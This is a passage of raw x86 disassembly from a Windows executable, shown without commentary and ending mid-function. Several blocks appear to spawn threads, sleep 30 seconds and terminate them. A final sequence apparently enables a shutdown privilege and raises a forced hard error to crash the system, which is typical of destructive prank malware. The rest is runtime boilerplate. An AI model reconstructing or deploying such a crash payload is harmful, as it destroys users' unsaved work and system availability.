  405854:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40585b:	00 
  40585c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405863:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  405868:	ff d0                	call   *%eax
  40586a:	83 ec 0c             	sub    $0xc,%esp
  40586d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405874:	00 
  405875:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40587c:	00 
  40587d:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405884:	00 
  405885:	c7 44 24 08 f8 31 40 	movl   $0x4031f8,0x8(%esp)
  40588c:	00 
  40588d:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405894:	00 
  405895:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40589c:	a1 14 a2 40 00       	mov    0x40a214,%eax
  4058a1:	ff d0                	call   *%eax
  4058a3:	83 ec 18             	sub    $0x18,%esp
  4058a6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4058a9:	e8 b4 f3 ff ff       	call   0x404c62
  4058ae:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  4058b5:	a1 50 a2 40 00       	mov    0x40a250,%eax
  4058ba:	ff d0                	call   *%eax
  4058bc:	83 ec 04             	sub    $0x4,%esp
  4058bf:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4058c6:	00 
  4058c7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4058ca:	89 04 24             	mov    %eax,(%esp)
  4058cd:	a1 58 a2 40 00       	mov    0x40a258,%eax
  4058d2:	ff d0                	call   *%eax
  4058d4:	83 ec 08             	sub    $0x8,%esp
  4058d7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4058da:	89 04 24             	mov    %eax,(%esp)
  4058dd:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  4058e2:	ff d0                	call   *%eax
  4058e4:	83 ec 04             	sub    $0x4,%esp
  4058e7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4058ee:	00 
  4058ef:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4058f6:	00 
  4058f7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4058fe:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  405903:	ff d0                	call   *%eax
  405905:	83 ec 0c             	sub    $0xc,%esp
  405908:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40590f:	00 
  405910:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405917:	00 
  405918:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40591f:	00 
  405920:	c7 44 24 08 56 35 40 	movl   $0x403556,0x8(%esp)
  405927:	00 
  405928:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40592f:	00 
  405930:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405937:	a1 14 a2 40 00       	mov    0x40a214,%eax
  40593c:	ff d0                	call   *%eax
  40593e:	83 ec 18             	sub    $0x18,%esp
  405941:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405944:	e8 f1 f4 ff ff       	call   0x404e3a
  405949:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  405950:	a1 50 a2 40 00       	mov    0x40a250,%eax
  405955:	ff d0                	call   *%eax
  405957:	83 ec 04             	sub    $0x4,%esp
  40595a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405961:	00 
  405962:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405965:	89 04 24             	mov    %eax,(%esp)
  405968:	a1 58 a2 40 00       	mov    0x40a258,%eax
  40596d:	ff d0                	call   *%eax
  40596f:	83 ec 08             	sub    $0x8,%esp
  405972:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405975:	89 04 24             	mov    %eax,(%esp)
  405978:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  40597d:	ff d0                	call   *%eax
  40597f:	83 ec 04             	sub    $0x4,%esp
  405982:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405989:	00 
  40598a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405991:	00 
  405992:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405999:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  40599e:	ff d0                	call   *%eax
  4059a0:	83 ec 0c             	sub    $0xc,%esp
  4059a3:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4059aa:	00 
  4059ab:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4059b2:	00 
  4059b3:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4059ba:	00 
  4059bb:	c7 44 24 08 bb 38 40 	movl   $0x4038bb,0x8(%esp)
  4059c2:	00 
  4059c3:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4059ca:	00 
  4059cb:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4059d2:	a1 14 a2 40 00       	mov    0x40a214,%eax
  4059d7:	ff d0                	call   *%eax
  4059d9:	83 ec 18             	sub    $0x18,%esp
  4059dc:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4059df:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4059e6:	00 
  4059e7:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4059ee:	00 
  4059ef:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4059f6:	00 
  4059f7:	c7 44 24 08 2e 3b 40 	movl   $0x403b2e,0x8(%esp)
  4059fe:	00 
  4059ff:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405a06:	00 
  405a07:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405a0e:	a1 14 a2 40 00       	mov    0x40a214,%eax
  405a13:	ff d0                	call   *%eax
  405a15:	83 ec 18             	sub    $0x18,%esp
  405a18:	89 45 cc             	mov    %eax,-0x34(%ebp)
  405a1b:	e8 f5 f5 ff ff       	call   0x405015
  405a20:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  405a27:	a1 50 a2 40 00       	mov    0x40a250,%eax
  405a2c:	ff d0                	call   *%eax
  405a2e:	83 ec 04             	sub    $0x4,%esp
  405a31:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405a38:	00 
  405a39:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405a3c:	89 04 24             	mov    %eax,(%esp)
  405a3f:	a1 58 a2 40 00       	mov    0x40a258,%eax
  405a44:	ff d0                	call   *%eax
  405a46:	83 ec 08             	sub    $0x8,%esp
  405a49:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405a50:	00 
  405a51:	8b 45 cc             	mov    -0x34(%ebp),%eax
  405a54:	89 04 24             	mov    %eax,(%esp)
  405a57:	a1 58 a2 40 00       	mov    0x40a258,%eax
  405a5c:	ff d0                	call   *%eax
  405a5e:	83 ec 08             	sub    $0x8,%esp
  405a61:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405a64:	89 04 24             	mov    %eax,(%esp)
  405a67:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  405a6c:	ff d0                	call   *%eax
  405a6e:	83 ec 04             	sub    $0x4,%esp
  405a71:	8b 45 cc             	mov    -0x34(%ebp),%eax
  405a74:	89 04 24             	mov    %eax,(%esp)
  405a77:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  405a7c:	ff d0                	call   *%eax
  405a7e:	83 ec 04             	sub    $0x4,%esp
  405a81:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405a88:	00 
  405a89:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405a90:	00 
  405a91:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405a98:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  405a9d:	ff d0                	call   *%eax
  405a9f:	83 ec 0c             	sub    $0xc,%esp
  405aa2:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405aa9:	00 
  405aaa:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405ab1:	00 
  405ab2:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405ab9:	00 
  405aba:	c7 44 24 08 56 3d 40 	movl   $0x403d56,0x8(%esp)
  405ac1:	00 
  405ac2:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405ac9:	00 
  405aca:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405ad1:	a1 14 a2 40 00       	mov    0x40a214,%eax
  405ad6:	ff d0                	call   *%eax
  405ad8:	83 ec 18             	sub    $0x18,%esp
  405adb:	89 45 c8             	mov    %eax,-0x38(%ebp)
  405ade:	e8 fc f6 ff ff       	call   0x4051df
  405ae3:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  405aea:	a1 50 a2 40 00       	mov    0x40a250,%eax
  405aef:	ff d0                	call   *%eax
  405af1:	83 ec 04             	sub    $0x4,%esp
  405af4:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405afb:	00 
  405afc:	8b 45 c8             	mov    -0x38(%ebp),%eax
  405aff:	89 04 24             	mov    %eax,(%esp)
  405b02:	a1 58 a2 40 00       	mov    0x40a258,%eax
  405b07:	ff d0                	call   *%eax
  405b09:	83 ec 08             	sub    $0x8,%esp
  405b0c:	8b 45 c8             	mov    -0x38(%ebp),%eax
  405b0f:	89 04 24             	mov    %eax,(%esp)
  405b12:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  405b17:	ff d0                	call   *%eax
  405b19:	83 ec 04             	sub    $0x4,%esp
  405b1c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405b23:	00 
  405b24:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405b2b:	00 
  405b2c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405b33:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  405b38:	ff d0                	call   *%eax
  405b3a:	83 ec 0c             	sub    $0xc,%esp
  405b3d:	8d 45 c7             	lea    -0x39(%ebp),%eax
  405b40:	89 44 24 0c          	mov    %eax,0xc(%esp)
  405b44:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405b4b:	00 
  405b4c:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  405b53:	00 
  405b54:	c7 04 24 13 00 00 00 	movl   $0x13,(%esp)
  405b5b:	e8 50 00 00 00       	call   0x405bb0
  405b60:	83 ec 10             	sub    $0x10,%esp
  405b63:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405b66:	89 44 24 14          	mov    %eax,0x14(%esp)
  405b6a:	c7 44 24 10 06 00 00 	movl   $0x6,0x10(%esp)
  405b71:	00 
  405b72:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405b79:	00 
  405b7a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405b81:	00 
  405b82:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405b89:	00 
  405b8a:	c7 04 24 99 99 99 c9 	movl   $0xc9999999,(%esp)
  405b91:	e8 22 00 00 00       	call   0x405bb8
  405b96:	83 ec 18             	sub    $0x18,%esp
  405b99:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  405ba0:	a1 50 a2 40 00       	mov    0x40a250,%eax
  405ba5:	ff d0                	call   *%eax
  405ba7:	83 ec 04             	sub    $0x4,%esp
  405baa:	90                   	nop
  405bab:	c9                   	leave
  405bac:	c2 10 00             	ret    $0x10
  405baf:	90                   	nop
  405bb0:	ff 25 ec a2 40 00    	jmp    *0x40a2ec
  405bb6:	90                   	nop
  405bb7:	90                   	nop
  405bb8:	ff 25 e8 a2 40 00    	jmp    *0x40a2e8
  405bbe:	90                   	nop
  405bbf:	90                   	nop
  405bc0:	a1 04 70 40 00       	mov    0x407004,%eax
  405bc5:	8b 00                	mov    (%eax),%eax
  405bc7:	85 c0                	test   %eax,%eax
  405bc9:	74 25                	je     0x405bf0
  405bcb:	83 ec 0c             	sub    $0xc,%esp
  405bce:	66 90                	xchg   %ax,%ax
  405bd0:	ff d0                	call   *%eax
  405bd2:	a1 04 70 40 00       	mov    0x407004,%eax
  405bd7:	8d 50 04             	lea    0x4(%eax),%edx
  405bda:	8b 40 04             	mov    0x4(%eax),%eax
  405bdd:	89 15 04 70 40 00    	mov    %edx,0x407004
  405be3:	85 c0                	test   %eax,%eax
  405be5:	75 e9                	jne    0x405bd0
  405be7:	83 c4 0c             	add    $0xc,%esp
  405bea:	c3                   	ret
  405beb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405bef:	90                   	nop
  405bf0:	c3                   	ret
  405bf1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405bf8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405bff:	90                   	nop
  405c00:	53                   	push   %ebx
  405c01:	83 ec 18             	sub    $0x18,%esp
  405c04:	8b 1d 70 6f 40 00    	mov    0x406f70,%ebx
  405c0a:	83 fb ff             	cmp    $0xffffffff,%ebx
  405c0d:	74 29                	je     0x405c38
  405c0f:	85 db                	test   %ebx,%ebx
  405c11:	74 11                	je     0x405c24
  405c13:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405c17:	90                   	nop
  405c18:	ff 14 9d 70 6f 40 00 	call   *0x406f70(,%ebx,4)
  405c1f:	83 eb 01             	sub    $0x1,%ebx
  405c22:	75 f4                	jne    0x405c18
  405c24:	c7 04 24 c0 5b 40 00 	movl   $0x405bc0,(%esp)
  405c2b:	e8 b0 b8 ff ff       	call   0x4014e0
  405c30:	83 c4 18             	add    $0x18,%esp
  405c33:	5b                   	pop    %ebx
  405c34:	c3                   	ret
  405c35:	8d 76 00             	lea    0x0(%esi),%esi
  405c38:	31 c0                	xor    %eax,%eax
  405c3a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405c40:	89 c3                	mov    %eax,%ebx
  405c42:	83 c0 01             	add    $0x1,%eax
  405c45:	8b 14 85 70 6f 40 00 	mov    0x406f70(,%eax,4),%edx
  405c4c:	85 d2                	test   %edx,%edx
  405c4e:	75 f0                	jne    0x405c40
  405c50:	eb bd                	jmp    0x405c0f
  405c52:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405c59:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405c60:	a1 34 90 40 00       	mov    0x409034,%eax
  405c65:	85 c0                	test   %eax,%eax
  405c67:	74 07                	je     0x405c70
  405c69:	c3                   	ret
  405c6a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405c70:	c7 05 34 90 40 00 01 	movl   $0x1,0x409034
  405c77:	00 00 00 
  405c7a:	eb 84                	jmp    0x405c00
  405c7c:	90                   	nop
  405c7d:	90                   	nop
  405c7e:	90                   	nop
  405c7f:	90                   	nop
  405c80:	ff 25 80 a2 40 00    	jmp    *0x40a280
  405c86:	90                   	nop
  405c87:	90                   	nop
  405c88:	90                   	nop
  405c89:	90                   	nop
  405c8a:	90                   	nop
  405c8b:	90                   	nop
  405c8c:	90                   	nop
  405c8d:	90                   	nop
  405c8e:	90                   	nop
  405c8f:	90                   	nop
  405c90:	31 c0                	xor    %eax,%eax
  405c92:	c3                   	ret
  405c93:	90                   	nop
  405c94:	90                   	nop
  405c95:	90                   	nop
  405c96:	90                   	nop
  405c97:	90                   	nop
  405c98:	90                   	nop
  405c99:	90                   	nop
  405c9a:	90                   	nop
  405c9b:	90                   	nop
  405c9c:	90                   	nop
  405c9d:	90                   	nop
  405c9e:	90                   	nop
  405c9f:	90                   	nop
  405ca0:	55                   	push   %ebp
  405ca1:	57                   	push   %edi
  405ca2:	56                   	push   %esi
  405ca3:	53                   	push   %ebx
  405ca4:	83 ec 2c             	sub    $0x2c,%esp
  405ca7:	a1 28 70 40 00       	mov    0x407028,%eax
  405cac:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405cb3:	00 
  405cb4:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405cbb:	00 
  405cbc:	3d 4e e6 40 bb       	cmp    $0xbb40e64e,%eax
  405cc1:	74 15                	je     0x405cd8
  405cc3:	f7 d0                	not    %eax
  405cc5:	a3 2c 70 40 00       	mov    %eax,0x40702c
  405cca:	83 c4 2c             	add    $0x2c,%esp
  405ccd:	5b                   	pop    %ebx
  405cce:	5e                   	pop    %esi
  405ccf:	5f                   	pop    %edi
  405cd0:	5d                   	pop    %ebp
  405cd1:	c3                   	ret
  405cd2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405cd8:	8d 44 24 10          	lea    0x10(%esp),%eax
  405cdc:	89 04 24             	mov    %eax,(%esp)
  405cdf:	ff 15 38 a2 40 00    	call   *0x40a238
  405ce5:	83 ec 04             	sub    $0x4,%esp
  405ce8:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  405cec:	33 5c 24 14          	xor    0x14(%esp),%ebx
  405cf0:	ff 15 28 a2 40 00    	call   *0x40a228
  405cf6:	89 c5                	mov    %eax,%ebp
  405cf8:	ff 15 2c a2 40 00    	call   *0x40a22c
  405cfe:	89 c7                	mov    %eax,%edi
  405d00:	ff 15 3c a2 40 00    	call   *0x40a23c
  405d06:	89 c6                	mov    %eax,%esi
  405d08:	8d 44 24 18          	lea    0x18(%esp),%eax
  405d0c:	89 04 24             	mov    %eax,(%esp)
  405d0f:	ff 15 48 a2 40 00    	call   *0x40a248
  405d15:	83 ec 04             	sub    $0x4,%esp
  405d18:	8b 44 24 18          	mov    0x18(%esp),%eax
  405d1c:	31 d8                	xor    %ebx,%eax
  405d1e:	33 44 24 1c          	xor    0x1c(%esp),%eax
  405d22:	31 e8                	xor    %ebp,%eax
  405d24:	31 f8                	xor    %edi,%eax
  405d26:	31 f0                	xor    %esi,%eax
  405d28:	3d 4e e6 40 bb       	cmp    $0xbb40e64e,%eax
  405d2d:	74 21                	je     0x405d50
  405d2f:	89 c2                	mov    %eax,%edx
  405d31:	f7 d2                	not    %edx
  405d33:	a3 28 70 40 00       	mov    %eax,0x407028
  405d38:	89 15 2c 70 40 00    	mov    %edx,0x40702c
  405d3e:	83 c4 2c             	add    $0x2c,%esp
  405d41:	5b                   	pop    %ebx
  405d42:	5e                   	pop    %esi
  405d43:	5f                   	pop    %edi
  405d44:	5d                   	pop    %ebp
  405d45:	c3                   	ret
  405d46:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405d4d:	8d 76 00             	lea    0x0(%esi),%esi
  405d50:	ba b0 19 bf 44       	mov    $0x44bf19b0,%edx
  405d55:	b8 4f e6 40 bb       	mov    $0xbb40e64f,%eax
  405d5a:	eb d7                	jmp    0x405d33
  405d5c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405d60:	55                   	push   %ebp
  405d61:	89 e5                	mov    %esp,%ebp
  405d63:	83 ec 28             	sub    $0x28,%esp
  405d66:	c7 05 20 93 40 00 09 	movl   $0xc0000409,0x409320
  405d6d:	04 00 c0 
  405d70:	8b 45 04             	mov    0x4(%ebp),%eax
  405d73:	8d 55 04             	lea    0x4(%ebp),%edx
  405d76:	c7 05 24 93 40 00 01 	movl   $0x1,0x409324
  405d7d:	00 00 00 
  405d80:	89 15 04 91 40 00    	mov    %edx,0x409104
  405d86:	a3 f8 90 40 00       	mov    %eax,0x4090f8
  405d8b:	a3 2c 93 40 00       	mov    %eax,0x40932c
  405d90:	8b 45 08             	mov    0x8(%ebp),%eax
  405d93:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405d9a:	a3 ec 90 40 00       	mov    %eax,0x4090ec
  405d9f:	a1 28 70 40 00       	mov    0x407028,%eax
  405da4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405da7:	a1 2c 70 40 00       	mov    0x40702c,%eax
  405dac:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405daf:	ff 15 4c a2 40 00    	call   *0x40a24c
  405db5:	83 ec 04             	sub    $0x4,%esp
  405db8:	c7 04 24 68 81 40 00 	movl   $0x408168,(%esp)
  405dbf:	ff 15 60 a2 40 00    	call   *0x40a260
  405dc5:	83 ec 04             	sub    $0x4,%esp
  405dc8:	ff 15 24 a2 40 00    	call   *0x40a224
  405dce:	c7 44 24 04 09 04 00 	movl   $0xc0000409,0x4(%esp)
  405dd5:	c0 
  405dd6:	89 04 24             	mov    %eax,(%esp)
  405dd9:	ff 15 54 a2 40 00    	call   *0x40a254
  405ddf:	83 ec 08             	sub    $0x8,%esp
  405de2:	e8 99 10 00 00       	call   0x406e80
  405de7:	90                   	nop
  405de8:	90                   	nop
  405de9:	90                   	nop
  405dea:	90                   	nop
  405deb:	90                   	nop
  405dec:	90                   	nop
  405ded:	90                   	nop
  405dee:	90                   	nop
  405def:	90                   	nop
  405df0:	83 ec 1c             	sub    $0x1c,%esp
  405df3:	8b 44 24 24          	mov    0x24(%esp),%eax
  405df7:	83 f8 03             	cmp    $0x3,%eax
  405dfa:	74 14                	je     0x405e10
  405dfc:	85 c0                	test   %eax,%eax
  405dfe:	74 10                	je     0x405e10
  405e00:	b8 01 00 00 00       	mov    $0x1,%eax
  405e05:	83 c4 1c             	add    $0x1c,%esp
  405e08:	c2 0c 00             	ret    $0xc
  405e0b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405e0f:	90                   	nop
  405e10:	89 44 24 04          	mov    %eax,0x4(%esp)
  405e14:	8b 54 24 28          	mov    0x28(%esp),%edx
  405e18:	8b 44 24 20          	mov    0x20(%esp),%eax
  405e1c:	89 54 24 08          	mov    %edx,0x8(%esp)
  405e20:	89 04 24             	mov    %eax,(%esp)
  405e23:	e8 18 09 00 00       	call   0x406740
  405e28:	b8 01 00 00 00       	mov    $0x1,%eax
  405e2d:	83 c4 1c             	add    $0x1c,%esp
  405e30:	c2 0c 00             	ret    $0xc
  405e33:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405e3a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405e40:	56                   	push   %esi
  405e41:	53                   	push   %ebx
  405e42:	83 ec 14             	sub    $0x14,%esp
  405e45:	83 3d 14 70 40 00 02 	cmpl   $0x2,0x407014
  405e4c:	8b 44 24 24          	mov    0x24(%esp),%eax
  405e50:	74 0a                	je     0x405e5c
  405e52:	c7 05 14 70 40 00 02 	movl   $0x2,0x407014
  405e59:	00 00 00 
  405e5c:	83 f8 02             	cmp    $0x2,%eax
  405e5f:	74 17                	je     0x405e78
  405e61:	83 f8 01             	cmp    $0x1,%eax
  405e64:	74 4a                	je     0x405eb0
  405e66:	83 c4 14             	add    $0x14,%esp
  405e69:	b8 01 00 00 00       	mov    $0x1,%eax
  405e6e:	5b                   	pop    %ebx
  405e6f:	5e                   	pop    %esi
  405e70:	c2 0c 00             	ret    $0xc
  405e73:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405e77:	90                   	nop
  405e78:	bb 30 b0 40 00       	mov    $0x40b030,%ebx
  405e7d:	be 30 b0 40 00       	mov    $0x40b030,%esi
  405e82:	39 de                	cmp    %ebx,%esi
  405e84:	74 e0                	je     0x405e66
  405e86:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405e8d:	8d 76 00             	lea    0x0(%esi),%esi
  405e90:	8b 03                	mov    (%ebx),%eax
  405e92:	85 c0                	test   %eax,%eax
  405e94:	74 02                	je     0x405e98
  405e96:	ff d0                	call   *%eax
  405e98:	83 c3 04             	add    $0x4,%ebx
  405e9b:	39 de                	cmp    %ebx,%esi
  405e9d:	75 f1                	jne    0x405e90
  405e9f:	83 c4 14             	add    $0x14,%esp
  405ea2:	b8 01 00 00 00       	mov    $0x1,%eax
  405ea7:	5b                   	pop    %ebx
  405ea8:	5e                   	pop    %esi
  405ea9:	c2 0c 00             	ret    $0xc
  405eac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405eb0:	8b 44 24 28          	mov    0x28(%esp),%eax
  405eb4:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  405ebb:	00 
  405ebc:	89 44 24 08          	mov    %eax,0x8(%esp)
  405ec0:	8b 44 24 20          	mov    0x20(%esp),%eax
  405ec4:	89 04 24             	mov    %eax,(%esp)
  405ec7:	e8 74 08 00 00       	call   0x406740
  405ecc:	83 c4 14             	add    $0x14,%esp
  405ecf:	b8 01 00 00 00       	mov    $0x1,%eax
  405ed4:	5b                   	pop    %ebx
  405ed5:	5e                   	pop    %esi
  405ed6:	c2 0c 00             	ret    $0xc
  405ed9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405ee0:	31 c0                	xor    %eax,%eax
  405ee2:	c3                   	ret
  405ee3:	90                   	nop
  405ee4:	90                   	nop
  405ee5:	90                   	nop
  405ee6:	90                   	nop
  405ee7:	90                   	nop
  405ee8:	90                   	nop
  405ee9:	90                   	nop
  405eea:	90                   	nop
  405eeb:	90                   	nop
  405eec:	90                   	nop
  405eed:	90                   	nop
  405eee:	90                   	nop
  405eef:	90                   	nop
  405ef0:	56                   	push   %esi
  405ef1:	53                   	push   %ebx
  405ef2:	bb 8c 81 40 00       	mov    $0x40818c,%ebx
  405ef7:	83 ec 54             	sub    $0x54,%esp
  405efa:	8b 44 24 60          	mov    0x60(%esp),%eax
  405efe:	8b 08                	mov    (%eax),%ecx
  405f00:	8d 51 ff             	lea    -0x1(%ecx),%edx
  405f03:	83 fa 05             	cmp    $0x5,%edx
  405f06:	77 07                	ja     0x405f0f
  405f08:	8b 1c 95 a8 82 40 00 	mov    0x4082a8(,%edx,4),%ebx
  405f0f:	dd 40 18             	fldl   0x18(%eax)
  405f12:	8b 70 04             	mov    0x4(%eax),%esi
  405f15:	dd 5c 24 48          	fstpl  0x48(%esp)
  405f19:	dd 40 10             	fldl   0x10(%eax)
  405f1c:	dd 5c 24 40          	fstpl  0x40(%esp)
  405f20:	dd 40 08             	fldl   0x8(%eax)
  405f23:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  405f2a:	dd 5c 24 38          	fstpl  0x38(%esp)
  405f2e:	e8 ad 0f 00 00       	call   0x406ee0
  405f33:	dd 44 24 48          	fldl   0x48(%esp)
  405f37:	89 74 24 0c          	mov    %esi,0xc(%esp)
  405f3b:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  405f3f:	c7 44 24 04 9c 81 40 	movl   $0x40819c,0x4(%esp)
  405f46:	00 
  405f47:	dd 5c 24 20          	fstpl  0x20(%esp)
  405f4b:	dd 44 24 40          	fldl   0x40(%esp)
  405f4f:	89 04 24             	mov    %eax,(%esp)
  405f52:	dd 5c 24 18          	fstpl  0x18(%esp)
  405f56:	dd 44 24 38          	fldl   0x38(%esp)
  405f5a:	dd 5c 24 10          	fstpl  0x10(%esp)
  405f5e:	e8 05 0f 00 00       	call   0x406e68
  405f63:	83 c4 54             	add    $0x54,%esp
  405f66:	31 c0                	xor    %eax,%eax
  405f68:	5b                   	pop    %ebx
  405f69:	5e                   	pop    %esi
  405f6a:	c3                   	ret
  405f6b:	90                   	nop
  405f6c:	90                   	nop
  405f6d:	90                   	nop
  405f6e:	90                   	nop
  405f6f:	90                   	nop
  405f70:	db e3                	fninit
  405f72:	c3                   	ret
  405f73:	90                   	nop
  405f74:	90                   	nop
  405f75:	90                   	nop
  405f76:	90                   	nop
  405f77:	90                   	nop
  405f78:	90                   	nop
  405f79:	90                   	nop
  405f7a:	90                   	nop
  405f7b:	90                   	nop
  405f7c:	90                   	nop
  405f7d:	90                   	nop
  405f7e:	90                   	nop
  405f7f:	90                   	nop
  405f80:	53                   	push   %ebx
  405f81:	83 ec 18             	sub    $0x18,%esp
  405f84:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  405f8b:	8d 5c 24 24          	lea    0x24(%esp),%ebx
  405f8f:	e8 4c 0f 00 00       	call   0x406ee0
  405f94:	c7 44 24 08 1b 00 00 	movl   $0x1b,0x8(%esp)
  405f9b:	00 
  405f9c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  405fa0:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  405fa7:	00 
  405fa8:	c7 04 24 c0 82 40 00 	movl   $0x4082c0,(%esp)
  405faf:	e8 a4 0e 00 00       	call   0x406e58
  405fb4:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  405fbb:	e8 20 0f 00 00       	call   0x406ee0
  405fc0:	8b 54 24 20          	mov    0x20(%esp),%edx
  405fc4:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  405fc8:	89 04 24             	mov    %eax,(%esp)
  405fcb:	89 54 24 04          	mov    %edx,0x4(%esp)
  405fcf:	e8 44 0e 00 00       	call   0x406e18
  405fd4:	e8 a7 0e 00 00       	call   0x406e80
  405fd9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405fe0:	57                   	push   %edi
  405fe1:	56                   	push   %esi
  405fe2:	53                   	push   %ebx
  405fe3:	89 c3                	mov    %eax,%ebx
  405fe5:	83 ec 30             	sub    $0x30,%esp
  405fe8:	8b 35 9c 93 40 00    	mov    0x40939c,%esi
  405fee:	85 f6                	test   %esi,%esi
  405ff0:	0f 8e ea 00 00 00    	jle    0x4060e0
  405ff6:	a1 a0 93 40 00       	mov    0x4093a0,%eax
  405ffb:	31 c9                	xor    %ecx,%ecx
